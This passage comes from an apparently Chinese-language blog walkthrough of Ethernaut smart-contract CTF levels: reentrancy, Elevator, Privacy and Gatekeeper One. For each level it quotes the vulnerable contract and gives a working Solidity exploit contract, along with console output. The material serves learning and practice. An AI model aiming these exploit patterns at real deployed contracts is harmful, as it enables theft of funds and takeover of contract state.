<li><strong>关键点</strong>：就在这一瞬间，钱发出来了，但目标合约还没来得及执行 <code>balances[msg.sender] -= _amount</code>。</li>
</ul>
</li>
</ul>
<p><strong>3. 循环收割 (<code>receive</code> 函数)</strong></p>
<p>这是攻击的“自动化”部分。当目标合约把钱转回来时，会自动触发这个函数。</p>
<ul>
<li><strong>触发时机</strong>：目标合约正在执行第一次 <code>withdraw</code>，刚把钱发出来，代码执行权暂时交给了攻击合约。</li>
<li>再次提款：<ul>
<li>攻击合约发现目标合约里还有别人的钱（比如还有 100 ETH）。</li>
<li>它立即再次调用 <code>target.withdraw(toWithdraw)</code>。</li>
</ul>
</li>
<li>为什么能成功？<ul>
<li>因为第一次调用的 <code>withdraw</code> 还没结束，余额扣除代码还没执行。</li>
<li>所以在目标合约看来，你的余额依然是 1 ETH！检查再次通过，它又发了一次钱。</li>
</ul>
</li>
<li>循环：<ul>
<li>第二次发钱 -&gt; 触发 <code>receive</code> -&gt; 第三次调用 <code>withdraw</code>…</li>
<li>这个过程会一直递归下去，直到 <code>targetBalance</code> 变为 0。</li>
</ul>
</li>
</ul>
<h3 id="Checks-Effects-Interactions"><a href="#Checks-Effects-Interactions" class="headerlink" title="Checks-Effects-Interactions"></a><code>Checks-Effects-Interactions</code></h3><p><strong>漏洞的根源：</strong></p>
<p>攻击者利用了<strong>物理层动作太快，逻辑层记账太慢</strong>的时间差。</p>
<ul>
<li><strong>错误顺序（当前漏洞）</strong>：<ol>
<li>检查账本（你有钱吗？有。）</li>
<li><strong>物理转账</strong>（给你钱！） -&gt; <strong>攻击者在这里插入代码，回到第1步</strong></li>
<li>修改账本（把你余额扣掉。）</li>
</ol>
</li>
<li><strong>正确顺序（安全写法）</strong>：<ol>
<li>检查账本（你有钱吗？有。）</li>
<li>修改账本（先把你的余额扣掉！）</li>
<li><strong>物理转账</strong>（给你钱。） -&gt; <strong>攻击者想重入？回到第1步，发现余额已经是0了，拒绝！</strong></li>
</ol>
</li>
</ul>
<p>这就是著名的 <strong>Checks-Effects-Interactions（检查-生效-交互）</strong></p>
<h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11. Elevator"></a>11. Elevator</h2><h3 id="external-的危害"><a href="#external-的危害" class="headerlink" title="external 的危害"></a><code>external</code> 的危害</h3><blockquote>
<p>This elevator won’t let you reach the top of your building. Right?</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li>Sometimes solidity is not good at keeping promises.</li>
<li>This <code>Elevator</code> expects to be used from a <code>Building</code>.</li>
</ul>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Building</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isLastFloor</span>(<span class="params">uint256</span>) external returns (bool);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Elevator</span> {</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">goTo</span>(<span class="params">uint256 _floor</span>) public {</span><br><span class="line">        <span class="title class_">Building</span> building = <span class="title class_">Building</span>(msg.<span class="property">sender</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!building.<span class="title function_">isLastFloor</span>(_floor)) {	<span class="comment">// 只有 isLastFloor 返回 false 进入</span></span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.<span class="title function_">isLastFloor</span>(floor);	<span class="comment">// isLastFloor 返回 false，top 也被赋值为false</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这个题目一开始看起来还有些难懂，其实目的就是把 <code>top</code> 变量改为 true，但是有一个悖论就是上面的注释，如果<code>isLastFloor</code> 仅仅被实现为一个根据楼层来判断是否是顶楼的逻辑函数，那确实无法改变。注意这一行代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Building building = Building(msg.sender);</span><br></pre></td></tr></table></figure></div>

<p>目标合约<strong>假设</strong>调用它的那个地址（也就是你的攻击合约）是一个符合 <code>Building</code> 接口规范的合约。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">building.isLastFloor(_floor)</span><br></pre></td></tr></table></figure></div>

<p>去调用 <code>msg.sender</code> 地址上的 <code>isLastFloor</code> 函数，因为 <code>msg.sender</code> 是你的合约，所以它自然就调用到了你写在攻击合约里的 <code>isLastFloor</code> 函数。</p>
<p>所以说<code>isLastFloor</code> 实际实现可以我们自己来完成。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义目标合约的接口，避免直接 import 导致的文件依赖问题</span></span><br><span class="line">interface <span class="title class_">IElevator</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">goTo</span>(<span class="params">uint256 _floor</span>) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击合约本身就是 "Building"</span></span><br><span class="line">contract <span class="title class_">ElevatorAttack</span> {</span><br><span class="line">    <span class="title class_">IElevator</span> public target;</span><br><span class="line">    bool public toggle = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _target</span>) {</span><br><span class="line">        target = <span class="title class_">IElevator</span>(_target);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 目标合约会回调这个函数</span></span><br><span class="line">    <span class="comment">// 第一次调用返回 false (进入 if)</span></span><br><span class="line">    <span class="comment">// 第二次调用返回 true (设置 top = true)</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isLastFloor</span>(<span class="params">uint256</span>) external returns (bool) {</span><br><span class="line">        toggle = !toggle;</span><br><span class="line">        <span class="keyword">return</span> toggle;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) external {</span><br><span class="line">        target.<span class="title function_">goTo</span>(<span class="number">10</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>Building</code> 是一个诚实的合约（比如真实的物理电梯控制系统），它的逻辑应该是固定的：</p>
<ul>
<li>如果 10 楼是顶楼，那么 <code>isLastFloor(10)</code> 永远返回 <code>true</code>。</li>
<li>如果 10 楼不是顶楼，那么 <code>isLastFloor(10)</code> 永远返回 <code>false</code>。</li>
</ul>
<p><strong>悖论出现了：</strong></p>
<ol>
<li>如果要进入 <code>if</code> 语句块（去修改 <code>top</code>），第一次检查必须返回 <code>false</code>（即“这不是顶楼”）。</li>
<li>进入 <code>if</code> 块后，执行 <code>top = building.isLastFloor(floor)</code>。既然刚才说了“不是顶楼”（返回 <code>false</code>），那么这里 <code>top</code> 就会被赋值为 <code>false</code>。</li>
</ol>
<p>这个题目想告诉你：<strong>不要信任外部合约调用的返回值，尤其是当该合约由用户控制时。</strong></p>
<p>你需要打破这个悖论，制造一个“撒谎”的 <code>Building</code>：</p>
<ul>
<li>第一次问：“这是顶楼吗？” -&gt; 回答：“不是”（为了骗过 <code>if</code> 检查）。</li>
<li>第二次问：“这是顶楼吗？” -&gt; 回答：“是”（为了把 <code>top</code> 改成 <code>true</code>）。</li>
</ul>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2026-01-28_23-12-51.png" alt="nipaste_2026-01-28_23-12-5"></p>
<h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12. Privacy"></a>12. Privacy</h2><h3 id="solidity-内存布局"><a href="#solidity-内存布局" class="headerlink" title="solidity 内存布局"></a><code>solidity</code> 内存布局</h3><blockquote>
<p>The creator of this contract was careful enough to protect the sensitive areas of its storage.</p>
<p>Unlock this contract to beat the level.</p>
<p>Things that might help:</p>
<ul>
<li>Understanding how storage works</li>
<li>Understanding how parameter parsing works</li>
<li>Understanding how casting works</li>
</ul>
<p>Tips:</p>
<ul>
<li>Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.</li>
</ul>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Privacy</span> {</span><br><span class="line">    bool public locked = <span class="literal">true</span>;</span><br><span class="line">    uint256 public <span class="variable constant_">ID</span> = block.<span class="property">timestamp</span>;</span><br><span class="line">    uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">    uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">    uint16 private awkwardness = <span class="title function_">uint16</span>(block.<span class="property">timestamp</span>);</span><br><span class="line">    bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">bytes32[<span class="number">3</span>] memory _data</span>) {</span><br><span class="line">        data = _data;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">unlock</span>(<span class="params">bytes16 _key</span>) public {</span><br><span class="line">        <span class="built_in">require</span>(_key == <span class="title function_">bytes16</span>(data[<span class="number">2</span>]));</span><br><span class="line">        locked = <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`</span></span><br><span class="line"><span class="comment">      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,</span></span><br><span class="line"><span class="comment">      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这一题有点类似第 8 题，依旧读 private 变量在控制台，主要学习solidity变量内存布局：</p>
<p><strong>存储布局分析</strong></p>
<ol>
<li><strong>Slot 0</strong>: <code>bool public locked</code><ul>
<li><code>bool</code> 占用 1 字节。</li>
<li><strong>状态</strong>：Slot 0 已用 1 字节，剩余 31 字节。</li>
</ul>
</li>
<li><strong>Slot 1</strong>: <code>uint256 public ID</code><ul>
<li><code>uint256</code> 占用 32 字节。</li>
<li>Slot 0 剩余空间不够，所以 <code>ID</code> 开启新的一行。</li>
<li><strong>状态</strong>：Slot 1 已满。</li>
</ul>
</li>
<li><strong>Slot 2</strong>: <code>flattening</code>, <code>denomination</code>, <code>awkwardness</code> (变量打包/Packing)<ul>
<li><code>uint8 private flattening</code> (1 字节) -&gt; 放入 Slot 2。</li>
<li><code>uint8 private denomination</code> (1 字节) -&gt; Slot 2 还有空间，紧接着放入。</li>
<li><code>uint16 private awkwardness</code> (2 字节) -&gt; Slot 2 还有空间，紧接着放入。</li>
<li><strong>状态</strong>：Slot 2 共使用了 1+1+2 = 4 字节，还剩 28 字节。</li>
</ul>
</li>
<li><strong>Slot 3, 4, 5</strong>: <code>bytes32[3] private data</code><ul>
<li>这是一个固定大小的数组，元素类型是 <code>bytes32</code>。</li>
<li><code>bytes32</code> 需要完整的 32 字节，无法塞进 Slot 2 剩余的 28 字节中，所以开启新槽位。</li>
<li><code>data[0]</code> -&gt; <strong>Slot 3</strong> (你之前读取的是这个)</li>
<li><code>data[1]</code> -&gt; <strong>Slot 4</strong></li>
<li><code>data[2]</code> -&gt; <strong>Slot 5</strong> (解锁需要这个！)</li>
</ul>
</li>
</ol>
<p>控制台输出如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;await contract.locked()</span><br><span class="line">  true</span><br><span class="line">&gt;&gt;await web3.eth.getStorageAt(contract.address, 5)</span><br><span class="line">  '0x446f4eccc0708635ea642632e4cb8d4e17f45745f3dfc3c744b745ada45b6741'</span><br><span class="line">&gt;&gt;await contract.locked()</span><br><span class="line">  false</span><br></pre></td></tr></table></figure></div>

<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IPrivacy</span> {</span><br><span class="line">    <span class="comment">// 修正：接口函数必须是 external</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">unlock</span>(<span class="params">bytes16 _key</span>) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PrivacyAttack</span> {</span><br><span class="line">    <span class="title class_">IPrivacy</span> public victimContract;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _victimAddress</span>) {</span><br><span class="line">        victimContract = <span class="title class_">IPrivacy</span>(_victimAddress);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 攻击函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) public {</span><br><span class="line">        <span class="comment">// 注意：这里的 password 必须是你自己实例中读取到的 data[2] (Slot 5) 的值</span></span><br><span class="line">        <span class="comment">// 请确保替换为你用 web3.eth.getStorageAt 查到的值</span></span><br><span class="line">        bytes32 password = <span class="number">0x446f4eccc0708635ea642632e4cb8d4e17f45745f3dfc3c744b745ada45b6741</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 转换取前16字节</span></span><br><span class="line">        bytes16 password16 = <span class="title function_">bytes16</span>(password);</span><br><span class="line">        </span><br><span class="line">        victimContract.<span class="title function_">unlock</span>(password16);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13. Gatekeeper One"></a>13. Gatekeeper One</h2><h3 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a><code>逻辑判断</code></h3><blockquote>
<p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<h5 id="Things-that-might-help"><a href="#Things-that-might-help" class="headerlink" title="Things that might help:"></a>Things that might help:</h5><ul>
<li>Remember what you’ve learned from the Telephone and Token levels.</li>
<li>You can learn more about the special function <code>gasleft()</code>, in Solidity’s documentation (see <a class="link" target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html">Units and Global Variables <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and <a class="link" target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls">External Function Calls <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>).</li>
</ul>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GatekeeperOne</span> {</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">gateOne</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> != tx.<span class="property">origin</span>);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">gateTwo</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">gasleft</span>() % <span class="number">8191</span> == <span class="number">0</span>);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">gateThree</span>(<span class="params">bytes8 _gateKey</span>) {</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) == <span class="title function_">uint16</span>(<span class="title function_">uint64</span>(_gateKey)), <span class="string">"GatekeeperOne: invalid gateThree part one"</span>);</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) != <span class="title function_">uint64</span>(_gateKey), <span class="string">"GatekeeperOne: invalid gateThree part two"</span>);</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) == <span class="title function_">uint16</span>(<span class="title function_">uint160</span>(tx.<span class="property">origin</span>)), <span class="string">"GatekeeperOne: invalid gateThree part three"</span>);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) public gateOne gateTwo <span class="title function_">gateThree</span>(_gateKey) returns (bool) {</span><br><span class="line">        entrant = tx.<span class="property">origin</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<ol>
<li><strong>function enter(bytes8 _gateKey)</strong>:<ul>
<li>这是标准的函数声明，函数名为 <code>enter</code>，接收一个 <code>bytes8</code> 类型的参数 <code>_gateKey</code>。</li>
</ul>
</li>
<li><strong>public</strong>:<ul>
<li>这是函数的<strong>可见性修饰符</strong>。表示任何人（外部账户或其他合约）都可以调用这个函数。</li>
</ul>
</li>
<li><strong>gateOne</strong>:<ul>
<li>这是一个**自定义修饰符 (Modifier)**。</li>
<li>在执行 <code>enter</code> 函数的主体代码之前，会先执行 <code>gateOne</code> 修饰符里的代码。</li>
<li>如果 <code>gateOne</code> 里的 <code>require</code> 失败，整个交易回滚，<code>enter</code> 函数体根本不会执行。</li>
</ul>
</li>
<li><strong>gateTwo</strong>:<ul>
<li>这是第二个自定义修饰符。</li>
<li>执行顺序是：先 <code>gateOne</code> -&gt; 再 <code>gateTwo</code> -&gt; 最后 <code>enter</code> 函数体。</li>
</ul>
</li>
<li><strong>gateThree(_gateKey)</strong>:<ul>
<li>这是第三个自定义修饰符，并且它<strong>接收参数</strong>。</li>
<li>这里将 <code>enter</code> 函数接收到的 <code>_gateKey</code> 参数，透传给了 <code>gateThree</code> 修饰符。</li>
<li>修饰符可以像函数一样接收参数来执行逻辑检查。</li>
</ul>
</li>
<li><strong>returns (bool)</strong>:<ul>
<li>表示函数执行成功后会返回一个布尔值。</li>
</ul>
</li>
</ol>
<p><strong>执行流程 (The Flow)</strong></p>
<p>当有人调用 <code>enter(key)</code> 时，实际的执行顺序如下：</p>
<ol>
<li><strong>进入 gateOne</strong>:<ul>
<li>检查 <code>msg.sender != tx.origin</code>。</li>
<li>遇到 <code>_;</code> (占位符)，代码跳出 <code>gateOne</code>，继续往下走。</li>
</ul>
</li>
<li><strong>进入 gateTwo</strong>:<ul>
<li>检查 <code>gasleft() % 8191 == 0</code>。</li>
<li>遇到 <code>_;</code>，代码跳出 <code>gateTwo</code>，继续往下走。</li>
</ul>
</li>
<li><strong>进入 gateThree(key)</strong>:<ul>
<li>检查那三个复杂的 Key 转换条件。</li>
<li>遇到 <code>_;</code>，代码跳出 <code>gateThree</code>，继续往下走。</li>
</ul>
</li>
<li><strong>最后执行 enter 函数体</strong>:<ul>
<li><code>entrant = tx.origin;</code></li>
<li><code>return true;</code></li>
</ul>
</li>
</ol>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IGatekeeperOne</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) external returns (bool);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GatekeeperOneAttack</span> {</span><br><span class="line">    <span class="title class_">IGatekeeperOne</span> public target;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _target</span>) {</span><br><span class="line">        target = <span class="title class_">IGatekeeperOne</span>(_target);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) external {</span><br><span class="line">        bytes8 key = <span class="title function_">bytes8</span>(<span class="title function_">uint64</span>(<span class="title function_">uint160</span>(tx.<span class="property">origin</span>))) &amp; <span class="number">0xFFFFFFFF0000FFFF</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; <span class="number">8191</span>; i++) {</span><br><span class="line">            <span class="comment">// We use call{gas: ...} to prevent the whole transaction from reverting if one attempt fails.</span></span><br><span class="line">            <span class="comment">// 8191 * 3 is a base amount to ensure we have enough gas for execution.</span></span><br><span class="line">            <span class="comment">// i is the offset we are searching for.</span></span><br><span class="line">            (bool success, ) = <span class="title function_">address</span>(target).<span class="property">call</span>{<span class="attr">gas</span>: i + (<span class="number">8191</span> * <span class="number">3</span>)}(</span><br><span class="line">                abi.<span class="title function_">encodeWithSignature</span>(<span class="string">"enter(bytes8)"</span>, key)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (success) {</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><strong>最终如下：</strong></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-12-18_00-14-39.png" alt="nipaste_2025-12-18_00-14-3"></p>
<h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14. Gatekeeper Two"></a>14. Gatekeeper Two</h2><h3 id="逻辑判断-1"><a href="#逻辑判断-1" class="headerlink" title="逻辑判断"></a><code>逻辑判断</code></h3><blockquote>
<p>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p>
<h5 id="Things-that-might-help-1"><a href="#Things-that-might-help-1" class="headerlink" title="Things that might help:"></a>Things that might help:</h5><ul>
<li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li>
<li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a class="link" target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html">Solidity Assembly <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a class="link" target="_blank" rel="noopener" href="https://ethereum.github.io/yellowpaper/paper.pdf">yellow paper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</li>
<li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a class="link" target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet">Solidity cheatsheet <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>
</ul>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title 